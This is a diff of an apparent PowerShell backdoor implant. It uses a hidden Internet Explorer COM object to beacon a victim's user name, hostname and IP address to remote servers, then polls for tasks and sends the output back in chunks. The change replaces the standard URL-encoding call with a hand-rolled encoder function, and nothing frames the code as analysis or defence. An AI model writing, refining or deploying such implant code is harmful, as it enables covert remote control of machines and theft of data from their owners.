@@ -3,6 +3,10 @@ $SRV=@("");
 $x=[system.text.encoding]::UTF8;
 $n=50000;
 $d=10;
+function _e{
+param($s);
+return $s.replace('+','%2B').replace('=','%3D').replace('/','%2F');
+}
 function _n{
 $global:e=new-object -com internetexplorer.application;
 $global:e.visible=$false;
@@ -40,7 +44,7 @@ while(1){
     $t0=[system.security.principal.windowsidentity]::GetCurrent().Name;
     $t1=[system.net.dns]::GetHostName();
     $t2=get-wmiobject Win32_NetworkAdapterConfiguration|where {$_.Ipaddress.length -gt 1};
-    $u=_g $SRV[$s_i] ('i='+[system.net.webutility]::UrlEncode([system.convert]::ToBase64String($x.GetBytes($t0+'|'+$t1+'|'+$t2.ipaddress[0]))));
+    $u=_g $SRV[$s_i] ('i='+(_e ([system.convert]::ToBase64String($x.GetBytes($t0+'|'+$t1+'|'+$t2.ipaddress[0])))));
     while(1){
       $b=new-object Collections.ArrayList;
       $s_i=($s_i+1)%$SRV.count;
@@ -69,11 +73,11 @@ while(1){
       $i=0;
       while ($i -le ($r.length - $n)) {
         $c=$r[$i..($i + $n - 1)] -join '';
-        _p $SRV[$s_i] ("u=$u&d="+[system.net.webutility]::UrlEncode($c));
+        _p $SRV[$s_i] ("u=$u&d="+(_e $c));
         $i+=$n;
       }
       $c=$r[$i..($r.length+$n-1)] -join '';
-      _p $SRV[$s_i] ("u=$u&d="+[system.net.webutility]::UrlEncode($c));
+      _p $SRV[$s_i] ("u=$u&d="+(_e $c));
       _p $SRV[$s_i] ("u=$u&d=");
     }
   }
